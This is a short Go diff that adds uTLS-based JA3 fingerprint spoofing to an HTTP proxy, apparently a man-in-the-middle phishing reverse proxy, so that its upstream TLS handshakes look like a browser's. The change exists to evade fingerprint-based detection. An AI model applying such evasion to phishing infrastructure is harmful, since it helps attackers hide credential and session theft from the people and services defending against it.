@@ -10,6 +10,7 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"context"
 	cryptorand "crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
@@ -240,6 +241,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		} else {
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
+	}
+
+	if err := p.configureUTLSFingerprinting(); err != nil {
+		log.Error("ja3 fingerprinting: %v", err)
 	}
 
 	if p.cookieName == "" {
@@ -3214,6 +3219,34 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 	} else {
 		p.Proxy.Tr.Dial = nil
 	}
+	return nil
+}
+
+// configureUTLSFingerprinting wires the goproxy transport to perform outbound
+// TLS handshakes with a browser-style uTLS fingerprint. This changes the JA3
+// signature of connections to upstream servers from the easily identifiable
+// Go standard library fingerprint to one that matches a real browser.
+func (p *HttpProxy) configureUTLSFingerprinting() error {
+	fpName := p.cfg.GetJa3Fingerprint()
+	if fpName == "" || fpName == "none" || fpName == "default" {
+		return nil
+	}
+
+	helloID, err := ParseUTLSFingerprint(fpName)
+	if err != nil {
+		return err
+	}
+
+	// Preserve any upstream proxy dialer that setProxy already installed.
+	var baseDial func(ctx context.Context, network, addr string) (net.Conn, error)
+	if existingDial := p.Proxy.Tr.Dial; existingDial != nil {
+		baseDial = func(ctx context.Context, network, addr string) (net.Conn, error) {
+			return existingDial(network, addr)
+		}
+	}
+
+	p.Proxy.Tr.DialTLSContext = UTLSDialTLSContext(helloID, baseDial)
+	log.Info("JA3 fingerprint spoofing enabled: %s", fpName)
 	return nil
 }
 
